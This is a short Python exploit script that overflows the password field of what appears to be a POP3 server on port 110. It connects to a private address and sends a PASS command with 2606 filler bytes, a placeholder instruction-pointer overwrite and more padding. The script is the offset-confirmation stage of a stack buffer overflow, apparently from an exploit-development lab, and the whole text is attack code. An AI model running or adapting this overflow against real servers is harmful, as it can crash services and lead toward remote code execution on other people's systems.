import socket

offset = 2606
eipVal = b'\x01\x02\x03\x04'
extra = 390

buffer = b'A' * offset + eipVal + b'C' * extra

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.1.4", 110))
s.recv(1024)
s.send(b'USER teste\r\n')
s.recv(1024)
s.send(b'PASS ' + buffer  + b'\r\n')
s.recv(1024)
s.send(b'QUIT\r\n')
s.close()
